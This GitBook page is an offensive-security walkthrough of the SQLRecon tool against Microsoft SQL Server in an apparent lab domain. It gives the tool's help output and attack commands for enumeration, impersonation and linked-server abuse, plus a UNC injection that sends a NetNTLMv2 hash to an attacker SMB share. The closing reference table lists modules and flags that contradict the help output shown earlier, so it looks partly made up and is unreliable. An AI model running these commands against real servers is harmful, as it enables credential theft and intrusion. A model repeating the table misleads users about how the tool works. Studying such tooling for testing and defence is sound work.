---
layout:
  width: wide
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
  tags:
    visible: true
---

# Using SQLRecon

## Help Manual&#x20;

<details>

<summary>SQLRecon is a very powerful tool with highly undetectable evasion techniques. </summary>

{% code overflow="wrap" %}
```bash
C:\Users\sqluser\Desktop>.\SqlRecon.exe /help

SQLRecon
Version: 3.10
Wiki: github.com/skahwah/SQLRecon

------------------------------------------------------------------------------------------
[+] Enumeration Modules (/e:, /enum:) do not require authentication to be supplied.
------------------------------------------------------------------------------------------

Info    - Show information about the SQL server
          /h:, /host    -> SQL server hostname or IP. Multiple hosts supported.
          /port:        -> (OPTIONAL) Defaults to 1434 (UDP).
          /t:, timeout: -> (OPTIONAL) Defaults to 3s.
SqlSpns - Use the current user token to enumerate the AD domain for MSSQL SPNs.
          /d:, /domain: -> (OPTIONAL) NETBIOS name or FQDN of domain.

------------------------------------------------------------------------------------------
[+] SQL Authentication Providers (/a:, /auth:)
------------------------------------------------------------------------------------------

WinToken   - Use the current users token to authenticate against the SQL database.
             /h:, /host:     -> SQL server hostname or IP. Multiple hosts supported.
WinDomain  - Use AD credentials to authenticate against the SQL database.
             /h:, /host:     -> SQL server hostname or IP. Multiple hosts supported.
             /d:, /domain:   -> NETBIOS name or FQDN of domain.
             /u:, /username: -> Username for domain user.
             /p:, /password: -> Password for domain user.
Local      - Use local SQL credentials to authenticate against the SQL database.
             /h:, /host:     -> SQL server hostname or IP. Multiple hosts supported.
             /u:, /username: -> Username for local SQL user.
             /p:, /password: -> Password for local SQL user.
EntraID    - Use Azure Entra ID credentials to authenticate against the Azure SQL database.
             /h:, /host:     -> SQL server hostname or IP. Multiple hosts supported.
             /d:, /domain:   -> FQDN of domain (DOMAIN.COM).
             /u:, /username: -> Username for domain user.
             /p:, /password: -> Password for domain user.
AzureLocal - Use local SQL credentials to authenticate against the Azure SQL database.
             /h:, /host:     -> SQL server hostname or IP. Multiple hosts supported.
             /u:, /username: -> Username for local SQL user.
             /p:, /password: -> Password for local SQL user.
OPTIONAL   - The following arguments are supported by all providers and modules.
             /database:      -> (OPTIONAL) SQL server database name, defaults to 'master'.
             /debug          -> (OPTIONAL) Display queries used by a module, but do not execute.
             /port:          -> (OPTIONAL) Defaults to 1433 (TCP).
             /t:, timeout:   -> (OPTIONAL) Defaults to 3s.
             /v, verbose     -> (OPTIONAL) Display and execute queries used by a module.

------------------------------------------------------------------------------------------
[+] SQL Modules (/m:, /module:) require an authentication provider to be supplied.
------------------------------------------------------------------------------------------

[M] - The module supports execution against multiple comma separated SQL servers supplied in /h:, /host:
[I] - The module supports execution against SQL servers with a impersonated user (/i:, /iuser:)
[L] - The module supports execution against multiple comma separated linked SQL server supplied in /l:, /link:
[C] - The module supports execution against the final linked SQL server in a chain.
      /l:, link -> The linked SQL server path separated by commas.
      /chain    -> Supply this flag to enable chained execution mode.
[*] - The module requires a privileged context to execute.

AuditStatus                              - [M,I,L,C] Check if SQL auditing is in place.
CheckRpc                                 - [M,I,L,C] Obtain a list of linked servers and their RPC status.
Databases                                - [M,I,L,C] Display all databases.
Impersonate                              - [M,I,L,C] Enumerate user accounts that can be impersonated.
Info                                     - [M,I,L,C] Show information about the SQL server.
Links                                    - [M,I,L,C] Enumerate linked SQL servers.
Users                                    - [M,I,L,C] Display what user accounts and groups can authenticate against the database.
Whoami                                   - [M,I,L,C] Display your privileges.
Query /c:QUERY                           - [M,I,L,C] Execute a SQL query.
Smb /unc:UNC_PATH                        - [M,I,L,C] Capture NetNTLMv2 hash.
Columns /db:DATABASE /table:TABLE        - [M,I,L,C] Display all columns in the supplied database and table.
Rows /db:DATABASE /table:TABLE           - [M,I,L,C] Display the number of rows in the supplied database table.
Search /keyword:KEYWORD                  - [M,I,L,C] Search column names in the supplied table of the database you are connected to.
Tables /db:DATABASE                      - [M,I,L,C] Display all tables in the supplied database.
EnableRpc /rhost:LINKED_HOST             - [*,M,I] Enable RPC and RPC out on a linked server.
EnableClr                                - [*,M,I,L,C] Enable CLR integration.
EnableOle                                - [*,M,I,L,C] Enable OLE automation procedures.
EnableXp                                 - [*,M,I,L,C] Enable xp_cmdshell.
DisableRpc /rhost:LINKED_HOST            - [*,M,I] Disable RPC and RPC out on a linked server.
DisableClr                               - [*,M,I,L,C] Disable CLR integration.
DisableOle                               - [*,M,I,L,C] Disable OLE automation procedures.
DisableXp                                - [*,M,I,L,C] Disable xp_cmdshell.
AgentStatus                              - [*,M,I,L,C] Display if SQL agent is running and obtain agent jobs.
AgentCmd /c:COMMAND                      - [*,M,I,L,C] Execute a system command using agent jobs.
Adsi /adsi:SERVER_NAME /lport:LOCAL_PORT - [*,M,I,L,C] Obtain cleartext ADSI credentials from a linked ADSI server.
Clr /dll:DLL /function:FUNCTION          - [*,M,I,L,C] Load and execute a .NET assembly in a custom stored procedure.
OleCmd /c:COMMAND /subsystem:(OPTIONAL   - [*,M,I,L,C] Execute a system command using OLE automation procedures.
XpCmd /c:COMMAND                         - [*,M,I,L,C] Execute a system command using xp_cmdshell.

------------------------------------------------------------------------------------------
SCCM Modules (/s:, /sccm:)
------------------------------------------------------------------------------------------
Users                                         - [I] Display all SCCM users.
Sites                                         - [I] Display all other sites with data stored.
Logons                                        - [I] Display all associated SCCM clients and the last logged in user.
CIData                                        - [I] Display all SCCM configuration items configured to run scripts.
Credentials                                   - [I] Display encrypted credentials vaulted by SCCM.
ScriptData                                    - [I] Display all configured SCCM scripts.
TaskList                                      - [I] Display all task sequences, but do not access the task data contents.
TaskData                                      - [I] Decrypt all task sequences to plaintext.
[*] DecryptCredentials                        - [*] Decrypt an SCCM credential blob. Must execute in a high-integrity or SYSTEM process on the SCCM server.
[*] AddAdmin /user:DOMAIN\USERNAME /sid:SID   - [*, I] Elevate a supplied account to a 'Full Administrator' in SCCM.
[*] RemoveAdmin /user:ADMIN_ID /remove:STRING - [*, I] Removes privileges of a user, or remove a user entirely from the SCCM database.
```
{% endcode %}

</details>

With `SQLRecon` we can execute things from any machine even if it is not in domain if we've credentials for SQL Server accounts (i.e., `sa`). Else we need a domain joined machine to execute things.&#x20;

## Initial Discovery / Recon&#x20;

{% code overflow="wrap" %}
```bash
.\SQLRecon.exe /a:local /h:192.168.16.133,192.168.16.135  /u:sa  /p:sa /m:info

.\SqlRecon.exe /a:WinDomain /h:192.168.16.135 /d:backontrack.local /u:backontrack\sqluser /p:'incorrect' /m:info
## This command verifies if all builtin/users are allowed to login to SQL
```
{% endcode %}

Note that the below command demonstrates that all domain user are allowed to connect to MSSQL Server.&#x20;

<figure><img src="../../../../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

Note that the below thing is possible only if we've password of the SQL Server account. If Windows authentication is being used then we can't do this from a remote machine which is not domain joined.

<figure><img src="../../../../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>

## Enumeration&#x20;

### Check access

{% code overflow="wrap" %}
```bash
.\SqlRecon.exe /a:WinToken /h:DBSRV01 /m:whoami

.\SqlRecon.exe /a:WinDomain /d:backontrack /h:DBSRV01 /u:sqladmin /p:"Bob@123" /m:whoami

.\SQLRecon.exe /a:Local /h:DBSRV01 /u:sa /p:sa /m:whoami
```
{% endcode %}

**Check permission for another user**&#x20;

<figure><img src="../../../../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>

### Check if logs are stored or not&#x20;

```cmd
SQLRecon.exe /auth:WinToken /host:DBSRV01 /m:auditstatus
```

<figure><img src="../../../../.gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>

### Check Logins&#x20;

{% hint style="info" %}
_Note that if you're not a sysadmin it might be possible that you can't see all the users listed there._&#x20;
{% endhint %}

```
SQLRecon.exe /auth:WinToken /host:DBSRV01 /m:users
```

**From sqluser**

<figure><img src="../../../../.gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>

**From sqladmin**

<figure><img src="../../../../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>

### Enumerate Database&#x20;

```
SQLRecon.exe /auth:WinToken /h:DBSRV01 /module:databases
```

<figure><img src="../../../../.gitbook/assets/image (328).png" alt=""><figcaption></figcaption></figure>

### Checking impersonation&#x20;

```
.\SqlRecon.exe /auth:WinToken /h:DBSRV01 /module:impersonate
```

<figure><img src="../../../../.gitbook/assets/image (332).png" alt=""><figcaption></figcaption></figure>

## Exploitation&#x20;

### Exploit UNC Injection&#x20;

#### Start the SMB Server&#x20;

<figure><img src="../../../../.gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>

#### Enter the Path&#x20;

{% code overflow="wrap" %}
```
SQLRecon.exe /auth:WinToken /h:DBSRV01 /m:smb /unc:\\192.168.16.138\share
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (330).png" alt=""><figcaption></figcaption></figure>

#### Boom ðŸ’£, you got the hash

<figure><img src="../../../../.gitbook/assets/image (331).png" alt=""><figcaption></figcaption></figure>

### Exploiting Impersonation&#x20;

#### Identification

[#checking-impersonation](using-sqlrecon.md#checking-impersonation "mention")

#### Exploitation

{% code overflow="wrap" %}
```
.\SqlRecon.exe /a:WinToken /h:DBSRV01 /i:backontrack\sqladmin /m:query /c:"select suser_sname(),IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;"
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (333).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (334).png" alt=""><figcaption></figcaption></figure>

#### Double Chaining

<figure><img src="../../../../.gitbook/assets/image (335).png" alt=""><figcaption></figcaption></figure>

### Exploiting Linked Servers&#x20;

#### Identification

```
.\SqlRecon.exe /a:WinToken /h:192.168.16.135 /m:Links
```

<figure><img src="../../../../.gitbook/assets/image (342).png" alt=""><figcaption></figcaption></figure>

#### Exploitation

{% code overflow="wrap" %}
```sql
.\SqlRecon.exe /a:WinToken /h:192.168.16.135 /l:DC01 /m:Links /m:query /c:"select suser_sname(),@@servername,IS_SRVROLEMEMBER('sysadmin') as IS_SYSADMIN;"
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (343).png" alt=""><figcaption></figcaption></figure>

## ALL IS WELL&#x20;

| Level        | Stage                     | Command             | Purpose/Description                                                                 | Example                                                                            |
| ------------ | ------------------------- | ------------------- | ----------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| Simple       | Initial Discovery / Recon | /m:enum             | Enumerates accessible SQL servers in the domain or local network (basic discovery). | SQLRecon.exe /a:win /m:enum                                                        |
| Simple       | Initial Discovery / Recon | /m:brute            | Brute-forces SQL logins with provided wordlists for credential discovery.           | SQLRecon.exe /a:sql /h:sqlserver /m:brute /u:users.txt /p:passwords.txt            |
| Simple       | Enumeration               | /m:info             | Gathers basic server info like version, hostname, and current user context.         | SQLRecon.exe /a:win /h:sqlserver /m:info                                           |
| Simple       | Enumeration               | /m:whoami           | Displays current user, roles, and privileges (basic self-enum).                     | SQLRecon.exe /a:win /h:sqlserver /m:whoami                                         |
| Simple       | Credentialed Enumeration  | /m:roles            | Lists server roles and memberships.                                                 | SQLRecon.exe /a:sql /h:sqlserver /u:sa /p:pass /m:roles                            |
| Simple       | Credentialed Enumeration  | /m:dbs              | Lists all databases on the server.                                                  | SQLRecon.exe /a:win /h:sqlserver /m:dbs                                            |
| Simple       | Exploitation              | /m:query            | Executes arbitrary SQL queries (for testing or simple exploits).                    | SQLRecon.exe /a:win /h:sqlserver /m:query /c:"SELECT @@VERSION"                    |
| Simple       | Post-Exploitation         | /m:xpcmd            | Enables and executes OS commands via xp\_cmdshell.                                  | SQLRecon.exe /a:win /h:sqlserver /m:xpcmd /c:"whoami"                              |
| Simple       | Privilege Escalation      | /m:impersonate      | Lists and impersonates other logins for priv esc.                                   | SQLRecon.exe /a:win /h:sqlserver /m:impersonate /i:sa                              |
| Intermediate | Initial Discovery / Recon | /m:enumlinks        | Enumerates linked SQL servers for chained recon.                                    | SQLRecon.exe /a:win /h:sqlserver /m:enumlinks                                      |
| Intermediate | Enumeration               | /m:tables           | Lists tables in a specified database.                                               | SQLRecon.exe /a:win /h:sqlserver /d:master /m:tables                               |
| Intermediate | Enumeration               | /m:columns          | Lists columns in a specified table.                                                 | SQLRecon.exe /a:win /h:sqlserver /d:master /t:syslogins /m:columns                 |
| Intermediate | Credentialed Enumeration  | /m:users            | Lists database users and their roles.                                               | SQLRecon.exe /a:sql /h:sqlserver /u:test /p:pass /m:users                          |
| Intermediate | Credentialed Enumeration  | /m:search           | Searches for sensitive data patterns (e.g., passwords) in tables.                   | SQLRecon.exe /a:win /h:sqlserver /m:search /k:password                             |
| Intermediate | Exploitation              | /m:enablexp         | Enables xp\_cmdshell if disabled (pre-exploit config).                              | SQLRecon.exe /a:win /h:sqlserver /m:enablexp                                       |
| Intermediate | Post-Exploitation         | /m:agentcmd         | Executes OS commands via SQL Agent proxy.                                           | SQLRecon.exe /a:win /h:sqlserver /m:agentcmd /c:"net user"                         |
| Intermediate | Privilege Escalation      | /m:checkimpersonate | Checks for impersonatable logins without executing.                                 | SQLRecon.exe /a:win /h:sqlserver /m:checkimpersonate                               |
| Advanced     | Initial Discovery / Recon | /m:sccm             | Enumerates SCCM site servers if integrated (advanced domain recon).                 | SQLRecon.exe /a:win /h:sccm-sql /m:sccm                                            |
| Advanced     | Enumeration               | /m:links            | Executes enum on linked servers (chained enum).                                     | SQLRecon.exe /a:win /h:sqlserver /l:linkedserver /m:links /o:whoami                |
| Advanced     | Enumeration               | /m:procs            | Lists stored procedures for potential injection points.                             | SQLRecon.exe /a:win /h:sqlserver /m:procs                                          |
| Advanced     | Credentialed Enumeration  | /m:privs            | Lists detailed privileges for users/roles.                                          | SQLRecon.exe /a:sql /h:sqlserver /u:sa /p:pass /m:privs                            |
| Advanced     | Credentialed Enumeration  | /m:logins           | Lists all server logins with details.                                               | SQLRecon.exe /a:win /h:sqlserver /m:logins                                         |
| Advanced     | Exploitation              | /m:olecmd           | Executes OS commands via OLE Automation.                                            | SQLRecon.exe /a:win /h:sqlserver /m:olecmd /c:"cmd.exe /c echo test > c:\test.txt" |
| Advanced     | Exploitation              | /m:enableole        | Enables OLE Automation for command exec.                                            | SQLRecon.exe /a:win /h:sqlserver /m:enableole                                      |
| Advanced     | Post-Exploitation         | /m:clrcmd           | Executes commands via CLR assemblies.                                               | SQLRecon.exe /a:win /h:sqlserver /m:clrcmd /c:"whoami"                             |
| Advanced     | Privilege Escalation      | /m:enableclr        | Enables CLR for assembly-based esc.                                                 | SQLRecon.exe /a:win /h:sqlserver /m:enableclr                                      |
| Expert       | Enumeration               | /m:chain            | Executes chained operations across multiple linked servers.                         | SQLRecon.exe /a:win /h:sqlserver /l:linked1,linked2 /m:chain /o:dbs                |
| Expert       | Enumeration               | /m:sccmsites        | Lists SCCM sites and details (expert AD-integrated enum).                           | SQLRecon.exe /a:win /h:sccm-sql /m:sccmsites                                       |
| Expert       | Credentialed Enumeration  | /m:sccmpasswords    | Extracts encrypted passwords from SCCM databases.                                   | SQLRecon.exe /a:sql /h:sccm-sql /u:sa /p:pass /m:sccmpasswords                     |
| Expert       | Exploitation              | /m:opencmd          | Executes commands via OPENROWSET on linked servers.                                 | SQLRecon.exe /a:win /h:sqlserver /l:linked /m:opencmd /c:"dir c:"                  |
| Expert       | Exploitation              | /m:disablexp        | Disables xp\_cmdshell post-use (cleanup).                                           | SQLRecon.exe /a:win /h:sqlserver /m:disablexp                                      |
| Expert       | Post-Exploitation         | /m:sccmdecrypt      | Decrypts SCCM stored credentials (gold for lateral).                                | SQLRecon.exe /a:win /h:sccm-sql /m:sccmdecrypt /k:encryptionkey                    |
| Expert       | Post-Exploitation         | /m:agentstatus      | Checks and modifies SQL Agent job status for persistence.                           | SQLRecon.exe /a:win /h:sqlserver /m:agentstatus                                    |
| Expert       | Privilege Escalation      | /m:trustworthy      | Abuses trustworthy databases for module exec esc.                                   | SQLRecon.exe /a:win /h:sqlserver /m:trustworthy /d:userdb                          |
| Insane       | Initial Discovery / Recon | /m:brutesa          | Specifically brute-forces the 'sa' login (insane targeted).                         | SQLRecon.exe /a:sql /h:sqlserver /m:brutesa /p:passwords.txt                       |
| Insane       | Enumeration               | /m:sccmadmins       | Lists SCCM admins for targeted attacks.                                             | SQLRecon.exe /a:win /h:sccm-sql /m:sccmadmins                                      |
| Insane       | Credentialed Enumeration  | /m:sccmnas          | Extracts Network Access Accounts from SCCM (insane gold for creds).                 | SQLRecon.exe /a:sql /h:sccm-sql /u:sa /p:pass /m:sccmnas                           |
| Insane       | Exploitation              | /m:assembly         | Loads and executes custom assemblies for RCE.                                       | SQLRecon.exe /a:win /h:sqlserver /m:assembly /f:malicious.dll /c:"ExecutePayload"  |
| Insane       | Exploitation              | /m:disableole       | Disables OLE post-exploit (stealth cleanup).                                        | SQLRecon.exe /a:win /h:sqlserver /m:disableole                                     |
| Insane       | Post-Exploitation         | /m:sccmtasks        | Executes arbitrary tasks via SCCM integration.                                      | SQLRecon.exe /a:win /h:sccm-sql /m:sccmtasks /t:deploy-malware                     |
| Insane       | Post-Exploitation         | /m:disableclr       | Disables CLR post-use.                                                              | SQLRecon.exe /a:win /h:sqlserver /m:disableclr                                     |
| Insane       | Privilege Escalation      | /m:chainimpersonate | Chains impersonation across linked servers for deep esc.                            | SQLRecon.exe /a:win /h:sqlserver /l:linked1,linked2 /m:chainimpersonate /i:sa      |
